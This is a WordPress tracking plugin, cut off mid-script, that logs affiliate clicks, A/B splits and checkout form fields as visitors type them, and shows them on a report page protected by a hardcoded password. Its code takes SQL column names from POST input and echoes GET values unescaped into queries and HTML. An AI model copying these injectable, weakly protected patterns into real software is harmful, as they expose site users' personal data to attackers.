<?php
/*
Plugin Name: Observer
Plugin URI: http://www.WebTechnologyMedia
Description: Observer is capable of watc
Version: 1.0
Author: Andy Normore
Author URI: http://www.WebTechnologyMedia.ca/plugins/finditquick
License: PRIVATE
*/


/* ----------------
*  OBSERVER ID COOKIE
*  -------------- */
function set_observer_cookie() {

	global $AB_HOME;
	global $AB_SEARCH;
	global $AB_HOME;
	global $wpdb;

	$GET = preg_replace( "/[^a-zA-Z0-9\s\p{P}]/", '', $_GET );

	// Pingdom Ignore
	// ------------
	if($_POST['pingdom'] == "check"){
		return;
	}
	
	// ===========
	// AB SPLIT TESTING
	// ===========
	$AB_SWITCH = $wpdb->get_row("SELECT * FROM `x_absplit` ORDER BY id DESC LIMIT 1");	
	
	// TOGGLE
	//--------
	$toggle = $GET['abtoggle'];
	if($toggle == "FOXTROT_LEMA_ALPHA7"){
		
		$i = $AB_SWITCH->value;
		$i ++;
		if($i > 2){
			$i = 1;
		}
		
		$wpdb->query("UPDATE `x_absplit` SET `value`='".$i."' WHERE `id`=".$AB_SWITCH->id);
		// error_log("CRON AB SPLIT ----- UPDATE `x_absplit` SET `value`='".$i."' WHERE `id`=".$AB_SWITCH->id);
		
		if (function_exists('w3tc_pgcache_flush')) {
			w3tc_pgcache_flush();
		} 
		
	}
	
	// Assign AB split
	//--------
	if ($AB_SWITCH->value == 1) {
		$AB_HOME     = 1;
		$AB_SEARCH   = 1;
		$AB_CHECKOUT = 1;
	} else {
		$AB_HOME     = 2;
		$AB_SEARCH   = 2;
		$AB_CHECKOUT = 2;
	}
	
	
	// BLOCKER
	if($_COOKIE['observer_id'] == "1"){		
		header('Location: http://www.google.com');
		exit();
	}
	
	
	
	// ===========
	// SET COOKIES
	// ===========
    if (!isset($_COOKIE['observer_id'])) {
		
		// Detect Browser
		// --------------
		$ua=getBrowser();
		$yourbrowser = $ua['name'] . " " . $ua['version'];
		if($ua['name']=="unknown" || $ua['name']=="Unknown"){
			return; // Probably a bot
		}
		
		// SMART ADS
		// Cake
		// Login: http://admin.smartadv.com/
		// Url:   https://www.dentaldiscountnetwork.com/?src=sa&reqid=441426&creativeid=128&affid=92&subid1&subid2&subid3&subid4
		// ---------
		if( isset($GET['src']) && $GET['src'] == "sa" ){
			$clickid_temp = $GET['reqid']; // set because you can't access a cookie on the same request
			
			$_COOKIE['observer_id'] = $clickid_temp; // fixes weird dupeip bug for organic
			setcookie('observer_id', $clickid_temp, time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			
			setcookie('creativeid', $GET['creativeid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('network',    $GET['src'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('affid',      $GET['affid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid1', 	$GET['subid1'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid2', 	$GET['subid2'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid3', 	$GET['subid3'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid4', 	$GET['subid4'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			
			
		}
		
		
		
		// CASH ADS
		// HasOffers
		// Login: http://cashadsllc.hasoffers.com/
		// Url:   https://www.dentaldiscountnetwork.com/?src=ca&clickid=1024233b1eead875656779e1c00fe5&creativeid&affid=1&subid1=testoffer&subid2&subid3&subid4
		// ---------
		if( isset($GET['src']) && $GET['src'] == "ca" ){
			$clickid_temp = $GET['clickid']; // set because you can't access a cookie on the same request
			
			$_COOKIE['observer_id'] = $clickid_temp; // fixes weird dupeip bug for organic
			setcookie('observer_id', $clickid_temp, time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			
			setcookie('creativeid', $GET['creativeid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('network',    $GET['src'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('affid',      $GET['affid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid1', 	$GET['subid1'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid2', 	$GET['subid2'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid3', 	$GET['subid3'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid4', 	$GET['subid4'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			
			// BLOCKER
			if($GET['affid'] == "4456"){
				setcookie('blocked', 	1, time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
				
				header('Location: http://www.google.com');
				exit();
			}
		}
		
		// ClickRover
		// HasOffers
		// Login: http://network.clickrover.com/
		// Url:   https://www.dentaldiscountnetwork.com/?src=cr&t_clickid={transaction_id}&creativeid={file_name}&affid={affiliate_id}&subid1={aff_sub}&subid2={aff_sub2}&subid3={aff_sub3}&subid4={aff_sub4}
		// ---------
		if( isset($GET['src']) && $GET['src'] == "cr" ){
			$clickid_temp = $GET['t_clickid']; // set because you can't access a cookie on the same request
			
			$_COOKIE['observer_id'] = $clickid_temp; // fixes weird dupeip bug for organic
			setcookie('observer_id', $clickid_temp, time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			
			setcookie('creativeid', $GET['creativeid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('network',    $GET['src'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('affid',      $GET['affid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid1', 	$GET['subid1'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid2', 	$GET['subid2'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid3', 	$GET['subid3'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid4', 	$GET['subid4'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
		}
		
		// 7ROI
		// HasOffers
		// Login: http://www.7roi.net/
		// Url:   https://www.dentaldiscountnetwork.com/?src=7r&reqid=#reqid#&creativeid=#cid#&affid=#affid#&subid1=#s1#&subid2=#s2#&subid3=#s3#&subid4=#s4#
		// ---------
		if( isset($GET['src']) && $GET['src'] == "7r" ){
			$clickid_temp = $GET['reqid']; // set because you can't access a cookie on the same request
			
			$_COOKIE['observer_id'] = $clickid_temp; // fixes weird dupeip bug for organic
			setcookie('observer_id', $clickid_temp, time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			
			setcookie('creativeid', $GET['creativeid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('network',    $GET['src'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('affid',      $GET['affid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid1', 	$GET['subid1'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid2', 	$GET['subid2'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid3', 	$GET['subid3'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid4', 	$GET['subid4'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
		}
		
		// RenownHoldings
		// LinkTrust
		// Login: https://partner6.linktrust.com/Campaign/CampaignSearch.aspx
		// Url:   https://www.dentaldiscountnetwork.com/?src=rh&t_clickid=02_140102160_fae666e7-72c3-4ae1-a824-3153862d41cd&creativeid=0&affid=303843&subid1
		// ---------
		if( isset($GET['src']) && $GET['src'] == "rh" ){
			$clickid_temp = $GET['t_clickid']; // set because you can't access a cookie on the same request
			
			$_COOKIE['observer_id'] = $clickid_temp; // fixes weird dupeip bug for organic
			setcookie('observer_id', $clickid_temp, time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			
			setcookie('creativeid', $GET['creativeid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('network',    $GET['src'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('affid',      $GET['affid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid1', 	$GET['subid1'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid2', 	$GET['subid2'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid3', 	$GET['subid3'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('subid4', 	$GET['subid4'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
		}
		
		// MundoMedia
		// 
		// Login: 
		// Url:   https://www.dentaldiscountnetwork.com/?src=mm&reqid=#reqid#&creativeid=#cid#&affid=#affid#&subid1=#s1#&subid2=#s2#&subid3=#s3#&subid4=#s4#
		// --------------
		// if( isset($GET['src']) && $GET['src'] == "mm" ){
			// $clickid_temp = $GET['reqid']; // set because you can't access a cookie on the same request
			// $_COOKIE['observer_id'] = $clickid_temp; // fixes weird dupeip bug for organic
			// setcookie('observer_id', $clickid_temp, time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			// setcookie('tracker', 'CAKE', time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			
			// setcookie('creativeid', $GET['creativeid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			// setcookie('network',    $GET['src'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			// setcookie('affid',      $GET['affid'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			// setcookie('subid1', 	$GET['subid1'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			// setcookie('subid2', 	$GET['subid2'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			// setcookie('subid3', 	$GET['subid3'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			// setcookie('subid4', 	$GET['subid4'], time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
		// }
		
		// ORGANIC
		// --------------
		if( !isset($GET['reqid']) && !isset($GET['src']) ){
			$clickid_temp = uniqid('organic_'); // set because you can't access a cookie on the same request
			$_COOKIE['observer_id'] = $clickid_temp; // fixes weird dupeip bug for organic
			setcookie('observer_id', $clickid_temp, time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('tracker', 'NONE', time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
			setcookie('network',    'ORGANIC', time()+1209600, COOKIEPATH, COOKIE_DOMAIN, false);
		}
		
		// Record Observer Click
		// --------------		
		$wpdb->query("INSERT INTO X_observer (observer_id, network, ipaddress, creativeid, affid, subid1, subid2, subid3, subid4, browser, ab_home, ab_search, ab_checkout) 
			VALUES ('".mysql_real_escape_string($clickid_temp)."', 
			'".mysql_real_escape_string($GET['src'])."', 
			'".mysql_real_escape_string($_SERVER['REMOTE_ADDR'])."', 
			'".mysql_real_escape_string($GET['creativeid'])."', 
			'".mysql_real_escape_string($GET['affid'])."', 
			'".mysql_real_escape_string($GET['subid1'])."', 
			'".mysql_real_escape_string($GET['subid2'])."', 
			'".mysql_real_escape_string($GET['subid3'])."', 
			'".mysql_real_escape_string($GET['subid4'])."',
			'".mysql_real_escape_string($yourbrowser)."',
			'".mysql_real_escape_string($AB_HOME)."', 
			'".mysql_real_escape_string($AB_SEARCH)."', 
			'".mysql_real_escape_string($AB_CHECKOUT)."')");
			
    }
	
	
}
add_action( 'init', 'set_observer_cookie');






/* ----------------
*  OBSERVER VIA AJAX
*  -------------- */
add_shortcode("observer_ajax", "observer_ajax_handler");
function observer_ajax_handler( $atts ){

	global $wpdb;

	extract( shortcode_atts( array(
		'field' => '',
		'value' => '',
	), $atts ) );
	
	$POST = preg_replace( "/[^a-zA-Z0-9\s\p{P}]/", '', $_POST );
	
	$field = $POST['field'];
	$value = $POST['value'];
	
	$wpdb->query("UPDATE X_observer SET ".$field." = '".mysql_real_escape_string($value)."' WHERE observer_id = '".mysql_real_escape_string($_COOKIE['observer_id'])."'");
	return  "UPDATE X_observer SET ".$field." = '".mysql_real_escape_string($value)."' WHERE observer_id = '".mysql_real_escape_string($_COOKIE['observer_id'])."'";
	
	return $html;
	
}






/* ----------------
*  OBSERVER DIRECT CALL (faster than AJAX, don't use this for input fields)
*  -------------- */
add_shortcode("observer_direct", "observer_direct_handler");
function observer_direct_handler( $atts ){

 	global $wpdb;
	
	$POST = preg_replace( "/[^a-zA-Z0-9\s\p{P}]/", '', $_POST );
	$GET = preg_replace( "/[^a-zA-Z0-9\s\p{P}]/", '', $_GET );
	
	extract( shortcode_atts( array(
		'field' => '',
		'value' => '',
	), $atts ) );
	
	if($value=='get'){
		$value = $GET['zip'];
	}
	
	// Detect Browser
	$ua=getBrowser();
	$yourbrowser = $ua['name'] . " " . $ua['version'];
	
	if(!isset($_COOKIE['observer_id'])){
		$CLICKID = $_GET['ClickID'];
	} else {
		$CLICKID = $_COOKIE['observer_id'];
	}
	
	$wpdb->query("UPDATE X_observer SET ".$field." = '".mysql_real_escape_string($value)."' WHERE observer_id = '".mysql_real_escape_string($CLICKID)."'");
	
}







/* ----------------
*  WooCommerce Addon
*  -------------- */
add_shortcode("observer_woocommerce", "observer_woocommerce_handler");
function observer_woocommerce_handler( $atts ){

	$html .= '
	<script>
	function partial(field,insert){	
	
		if(typeof(insert) != "undefined" && insert !== null){
			var dataString = "field="+field+"&value="+insert;
		} else {
			var dataString = "field="+field+"&value="+jQuery("#"+field).val();
		}
	
		jQuery.ajax({
		  type: "POST",
		  url: "/observer-ajax/", 
		  data: dataString,
		  success: function(data) {},
		  dataType: "html"
		});
		
	}
	
	
	jQuery("#billing_first_name").change(function(){
		partial("billing_first_name");
	});
	
	jQuery("#billing_last_name").change(function(){
		partial("billing_last_name");
	});
	
	jQuery("#billing_email").change(function(){
		partial("billing_email");
	});
	
	jQuery("#billing_address_1").change(function(){
		partial("billing_address_1");
	});
	
	jQuery("#billing_address_2").change(function(){
		partial("billing_address_2");
	});
	
	jQuery("#billing_city").change(function(){
		partial("billing_city");
	});
	
	jQuery("#billing_phone").change(function(){
		partial("billing_phone");
	});
	
	jQuery("#billing_postcode").change(function(){
		partial("billing_postcode");
	});
	
	jQuery("#billing_state").change(function(){
		partial("billing_state");
	});
	

	jQuery(document.body).on("change","#ccnum",function(){
		partial("cc_number",1);
	});
	
	jQuery(document.body).on("change","#cardtype",function(){
		partial("cc_type",1);
	});
	
	jQuery(document.body).on("change","#expmonth",function(){
		partial("cc_exp1",1);
	});
	
	jQuery(document.body).on("change","#expyear",function(){
		partial("cc_exp2",1);
	});
	
	jQuery(document.body).on("change","#cvv",function(){
		partial("cc_security",1);
	});

	jQuery(document.body).on("click",".form-submit",function(){
		partial("clicked_checkout",1);
	});
	
	
	
	
	</script>';
	
	return $html;


}







function getBrowser() 
{ 
    $u_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    //First get the platform?
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    }
    
    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Internet Explorer'; 
        $ub = "MSIE"; 
    } 
    elseif(preg_match('/Firefox/i',$u_agent)) 
    { 
        $bname = 'Mozilla Firefox'; 
        $ub = "Firefox"; 
    } 
    elseif(preg_match('/Chrome/i',$u_agent)) 
    { 
        $bname = 'Google Chrome'; 
        $ub = "Chrome"; 
    } 
    elseif(preg_match('/Safari/i',$u_agent)) 
    { 
        $bname = 'Apple Safari'; 
        $ub = "Safari"; 
    } 
    elseif(preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Opera'; 
        $ub = "Opera"; 
    } 
    elseif(preg_match('/Netscape/i',$u_agent)) 
    { 
        $bname = 'Netscape'; 
        $ub = "Netscape"; 
    } 
    
    // finally get the correct version number
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }
    
    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }
    
    // check if we have a number
    if ($version==null || $version=="") {$version="?";}
    
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
} 












/* ----------------
*  OBSERVER Report
*  -------------- */
add_shortcode("observer_quickreport", "observer_quickreport_handler");
function observer_quickreport_handler( $atts ){

	date_default_timezone_set('America/Toronto');
	
	// SECURITY
	// --------
	if($_GET['password'] != "showpath"){
		$html = "<form action='/quickreport' method='get'><input name='password' placeholder='enter password' /></form>";
		return $html;
	}


 	global $wpdb;
	
	$html .= "<div id='content'>";
	
	// Default Show Path
	if(!isset($_GET['show'])){
		$_GET['show'] = "all";
	}
	
	// Date Selection
	if(!isset($_GET['viewdate'])){
		$now = date('Y-m-d');
	} else {
		$now = $_GET['viewdate'];
		$_GET['viewdate'] = date('Y-m-d');
	}
	
	if($_GET['autorefresh']){ 
		$refresh_checked = ' checked ';
	}
		
		$html = '
		<style>
		
			body{background:#000; color:#fff; font-family:arial;}
			td, th {
				border: 1px solid black;
			}
			table {
				border-collapse: collapse;
			}
			
			.new_click td {border:1px solid #ffd200}
			.converted td {background:#f0ff00 !important; color:#000 !important;}
			.callback td {background:#f79fff !important; color:#000 !important;}
			.leavemsg td {background:#ffca58 !important; color:000 !important;}
			.unsubscribe td {background:#590097 !important; color:#fff !important;}
			.zip_invalid td {background:#97004e !important; color:#fff !important;}
			
			h1 {font-size:20px;}
			h2 {font-size:15px;}
			
			form {display:inline;}
			
			#countdown {position:absolute; right:0px; top:0px; font-size:12px;}
			#networks {position:absolute; right:0px; top: 40px; font-size:16px; text-align:right;}
			#networks a {color:#FFF;} #networks a:hover {color:#F00;}
			a {color:#8afff8;}
			a:hover {color:#8afff8; text-decoration:underline;}
			
			.datepicker {color:#000;}
			.prev, .next {background:#f0f;}
			
			
		</style>
		
		<h1>Showing Traffic for: '. $now .' </h1>
		
			<div class="row">
			  <div class="col-md-4">
			  
					<form action="/quickreport" method="GET"> 
						<input type="hidden" name="show" value="all" />
						<input type="hidden" name="viewdate" value="'.$_GET['viewdate'].'" />
						<input type="hidden" name="password" value="showpath" />
						<input type="submit" value="Show All" class="btn btn-primary"/>
					</form>
					
					<form action="/quickreport" method="GET"> 
						<input type="hidden" name="show" value="organic" />
						<input type="hidden" name="viewdate" value="'.$_GET['viewdate'].'" />
						<input type="hidden" name="password" value="showpath" />
						<input type="submit" value="Show Organic" class="btn btn-primary" />
					</form>
					
					<form action="/quickreport" method="GET"> 
						<input type="hidden" name="show" value="affiliate" />
						<input type="hidden" name="viewdate" value="'.$_GET['viewdate'].'" />
						<input type="hidden" name="password" value="showpath" />
						<input type="submit" value="Show Affiliate" class="btn btn-primary" />
					</form>
					
					<br /><br />
					<form action="/quickreport" method="GET" class="form-inline">
						<input type="hidden" name="show" value="'.$_GET['show'].'" />
						<input type="hidden" name="password" value="showpath" />
					
						<input type="submit" value="View Date" class="btn btn-info" />
						 <div class="form-group">
							<input type="text" name="viewdate" value="'.$_GET['viewdate'].'" class="form-control" id="datepicker" placeholder="'.$_GET['viewdate'].'" data-date-format="yyyy-mm-dd" />
						</div>
					</form>
			  
			  </div>
			  <div class="col-md-4"></div>
			  <div class="col-md-4"></div>
			</div>
			
			
			<!-- REPORT TABLE
			----------------- -->
			<table border=1>
				<th>Type</th>
				<th>Clicks</th>
				<th>Searched</th>
				<th>Checkouts</th>
				<th>Conversion</th>
				
				<tr id="stat_all">
					<td class="title" >All</td>
					<td class="clicks" >clicks</td>
					<td class="searches" >engagement</td>
					<td class="checkouts" >checkouts</td>
					<td class="conversion" >conversion</td>
				</tr>
				
				<tr id="stat_a">
					<td class="title" >1</td>
					<td class="clicks" >clicks</td>
					<td class="searches" >engagement</td>
					<td class="checkouts" >checkouts</td>
					<td class="conversion" >conversion</td>
				</tr>
				
				<tr id="stat_b">
					<td class="title" >2</td>
					<td class="clicks" >clicks</td>
					<td class="searches" >engagement</td>
					<td class="checkouts" >checkouts</td>
					<td class="conversion" >conversion</td>
				</tr>
			</table>
			
			
			<span id="countdown">
				<input type="checkbox" id="refresh_check" '. $refresh_checked .'/>
				<span class="count_text">30</span>
			</span> 
			
			
			<span id="networks">
				<a href="http://admin.smartadv.com/aff.aspx" target="_blank">sa - SmartAds</a>
				<br />
				<a href="http://cashadsllc.hasoffers.com/snapshot" target="_blank">ca - CashAds LLC</a>
				<br />
				<a href="http://network.clickrover.com/snapshot" target="_blank">cr - ClickRover</a>
				<br />
				<a href="http://www.7roi.net/" target="_blank">7r - 7Roi</a>
				<br />
				<a href="http://www.mundomedia.com/" target="_blank">mm - MundoMedia</a>
			</span> 
		
		
			<!-- TRAFFIC TABLE
			----------------- -->
			<table border=1>
					<th>IPaddress</th>
					<th>Browser</th>
					<th>Time</th>
					<th>Network</th>
					<th>AffID</th>
					<th>SubID1</th>
					<th>SubID2</th>
					<th>SubID3</th>
					<th>SubID4</th>
					<th>CreativeID</th>
					<th>ClickID</th>
					<th>Unsubd</th>
					
					<th>AB Split</th>
					
					<th>Zip</th>
					<th>Zip Email</th>
					<th>Invalid</th>
					<th>Aetna</th>
					<th>Careington</th>
					<th>CHECKOUT</th>
					
					<th>FirstName</th>
					<th>LastName</th>
					<th>Email</th>
					
					<th>Address 1</th>
					<th>Address 2</th>
					<th>City</th>
					<th>Phone</th>
					<th>Postcode</th>
					
					<th>CC-#</th>
					<th>CC-type</th>
					<th>CC-exp1</th>
					<th>CC-exp2</th>
					<th>CC-security</th>
					
					<th>Leave</th>
					<th>Name</th>
					<th>Phone</th>
					<th>Email</th>
					<th>Message</th>
					
					<th>OrderNow</th>
					<th>TX Status</th>
					
					<th>Conversion</th>
					<th>Pixel</th>
					<th>Reply</th>
		';
		
		
		if(isset($_GET['show'])){
		
			if($_GET['show'] == "all"){
				$results = $wpdb->get_results("SELECT * FROM X_observer WHERE time BETWEEN '".$now." 00:00:00' AND '".$now." 23:59:59' ORDER BY time DESC ");
			}
			
			if($_GET['show'] == "organic"){
				$results = $wpdb->get_results("SELECT * FROM X_observer WHERE time BETWEEN '".$now." 00:00:00' AND '".$now." 23:59:59' AND AFFID = '' ORDER BY time DESC ");
			}
			
			if($_GET['show'] == "affiliate"){
				$results = $wpdb->get_results("SELECT * FROM X_observer WHERE time BETWEEN '".$now." 00:00:00' AND '".$now." 23:59:59' AND AFFID != '' ORDER BY time DESC ");
			}
			
			// Stat Defaults
			// --------
			$stat_all_clicks = 0;
			$stat_all_checkout = 0;
			
			$stat_a_clicks = 0;
			$stat_a_zip = 0;
			$stat_a_checkout = 0;
			
			$stat_b_clicks = 0;
			$stat_b_zip = 0;
			$stat_b_checkout = 0;
			
			foreach($results as $row){
			
				$time_now = strtotime("now") ;
				$time_click = strtotime($row->time);
				
				$time_difference = ($time_now - $time_click);
				// var_dump($time_difference);
				
				$extra_class = "";
				if($time_difference < 300){
					$extra_class .= " new_click";
				}
				
				
				
				if($row->billing_phone != "" && $row->clicked_checkout == "" && $row->checkout != "" ){
					$extra_class .= " callback";
				}
				
				if($row->leave_phone != "" ){
					$extra_class .= " leavemsg";
				}
				
				if($row->zip_invalid == "1" ){
					$extra_class = " zip_invalid";
				}
				
				if($row->unsubscribe == "1" ){
					$extra_class = " unsubscribe";
				}
				
				if($row->conversion == "1"){
					$extra_class = " converted";
				}
			
				$html .= "
					<tr class='".$extra_class."'>
						<td style='".observer_not_empty($row->ipaddress)."'>".$row->ipaddress."</td>
						<td style='".observer_not_empty($row->browser)."'>".$row->browser."</td>
						<td style='".observer_not_empty($row->time)."'>".$row->time."</td>
						<td style='".observer_not_empty($row->network)."'>".$row->network."</td>
						<td style='".observer_not_empty($row->affid)."'>".$row->affid."</td>
						<td style='".observer_not_empty($row->subid1)."'>".$row->subid1."</td>
						<td style='".observer_not_empty($row->subid2)."'>".$row->subid2."</td>
						<td style='".observer_not_empty($row->subid3)."'>".$row->subid3."</td>
						<td style='".observer_not_empty($row->subid4)."'>".$row->subid4."</td>
						<td style='".observer_not_empty($row->creativeid)."'>".$row->creativeid."</td>
						<td style='".observer_not_empty($row->observer_id)."'><a href='http://account.h.mouseflow.com/my-account/recordings?website=02e6e6c1-35e8-4ada-862d-8d313cfb2e7f&search=".$row->observer_id."' target='_blank'>".$row->observer_id."</a></td>
						<td style='".observer_not_empty($row->unsubscribe)."'>".$row->unsubscribe."</td>
						
						<td style='".observer_not_empty($row->ab_home)."'>".$row->ab_home."</td>
						
						<td style='".observer_not_empty($row->zip)."'><a href='https://www.dentaldiscountnetwork.com/search-plans/?distance=1&zip=".$row->zip."&group1=Family' target='_blank'>".$row->zip."</a></td>
						<td style='".observer_not_empty($row->zip_email)."'>".$row->zip_email."</td>
						<td style='".observer_not_empty($row->zip_invalid)."'>".$row->zip_invalid."</td>
						
						<td style='".observer_not_empty($row->open_ddn)."'>".$row->open_ddn."</td>
						<td style='".observer_not_empty($row->open_care)."'>".$row->open_care."</td>
						<td style='".observer_not_empty($row->checkout)."'>".$row->checkout."</td>
						
						<td style='".observer_not_empty($row->billing_first_name)."'>".$row->billing_first_name."</td>
						<td style='".observer_not_empty($row->billing_last_name)."'>".$row->billing_last_name."</td>
						<td style='".observer_not_empty($row->billing_email)."'>".$row->billing_email."</td>					
						<td style='".observer_not_empty($row->billing_address_1)."'>".$row->billing_address_1."</td>
						<td style='".observer_not_empty($row->billing_address_2)."'>".$row->billing_address_2."</td>
						<td style='".observer_not_empty($row->billing_city)."'>".$row->billing_city."</td>
						<td style='".observer_not_empty($row->billing_phone)."'>".$row->billing_phone."</td>
						<td style='".observer_not_empty($row->billing_postcode)."'>".$row->billing_postcode."</td>
						
						<td style='".observer_not_empty($row->cc_number)."'>".$row->cc_number."</td>
						<td style='".observer_not_empty($row->cc_type)."'>".$row->cc_type."</td>
						<td style='".observer_not_empty($row->cc_exp1)."'>".$row->cc_exp1."</td>
						<td style='".observer_not_empty($row->cc_exp2)."'>".$row->cc_exp2."</td>
						<td style='".observer_not_empty($row->cc_security)."'>".$row->cc_security."</td>
						
						<td style='".observer_not_empty($row->leave_popped)."'>".$row->leave_popped."</td>
						<td style='".observer_not_empty($row->leave_name)."'>".$row->leave_name."</td>
						<td style='".observer_not_empty($row->leave_phone)."'>".$row->leave_phone."</td>
						<td style='".observer_not_empty($row->leave_email)."'>".$row->leave_email."</td>
						<td style='".observer_not_empty($row->leave_message)."'>".$row->leave_message."</td>
						
						<td style='".observer_not_empty($row->clicked_checkout)."'>".$row->clicked_checkout."</td>
						<td style='".observer_not_empty($row->transaction)."'>".$row->transaction."</td>
						
						<td style='".observer_not_empty($row->conversion)."'>".$row->conversion."</td>
						<td style='".observer_not_empty($row->pixel)."'>".$row->pixel."</td>
						<td style='".observer_not_empty($row->pixel_reply)."'>".$row->pixel_reply."</td>
					</tr>
				";
			
			
				// Stat Logic
				// ----------
				
				// Clicks
				
				$stat_all_clicks += 1;
				
				// SPLIT 1
				if($row->ab_home == 1){
					$stat_a_clicks += 1;
					
					if($row->zip != ""){
						$stat_a_zip += 1;
					}
					
					if($row->checkout == 1){
						$stat_a_clicks += 1;
					}
					if($row->checkout == 1){
						$stat_a_checkout += 1;
					}
				}
				
				// SPLIT 2
				if($row->ab_home == 2){
					$stat_b_clicks += 1;
					
					if($row->zip != ""){
						$stat_b_zip += 1;
					}
					
					if($row->checkout == 1){
						$stat_b_checkout += 1;
					}
				}
				
				// Engagement 
				// (Javascript)
				
			
			
			}
		
		}
		
		$html .= '</table>';
		
		
		if($stat_a_clicks > 0){
			$engage_a = substr($stat_a_zip / $stat_a_clicks * 100, 0, 2);
		} else {
			$engage_a = 0;
		}
		if($stat_b_clicks > 0){
			$engage_b = substr($stat_b_zip / $stat_b_clicks * 100, 0, 2);
		} else {
			$engage_b = 0;
		}
	
	
		$html .= "
			<script src='//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js' ></script>
		
			<script type='text/javascript'>

			
				// UPDATE TIMER
				// -------------
				$( document ).ready(function() {
					setInterval(updateText, 1000);
					setInterval(update, 1000*30);
					
					$('#datepicker').datepicker();
				});
				

				function update(){
					if($('#refresh_check').prop('checked') ){
						window.location.replace('/quickreport/?show=".$_GET['show']."&password=showpath&viewdate=".$_GET['viewdate']."&autorefresh=1');
					}
				}
				
				function updateText(){
					timer = $('#countdown .count_text').text();
					timer -= 1;					
					
					if(timer <= 0){
						timer = 30;
					}	
					
					$('#countdown .count_text').text(timer);
				}
				
				
				// STATS
				// -------------
				$('#stat_all .clicks').html('".$stat_all_clicks."');
				$('#stat_a   .clicks').html('".$stat_a_clicks."');
				$('#stat_b   .clicks').html('".$stat_b_clicks."');
				
				$('#stat_all .searches').html('X');
				$('#stat_a   .searches').html('". $engage_a . " %');
				$('#stat_b   .searches').html('". $engage_b . " %');
				
				$('#stat_all .checkouts').html('X');
				$('#stat_a   .checkouts').html('".$stat_a_checkout."');
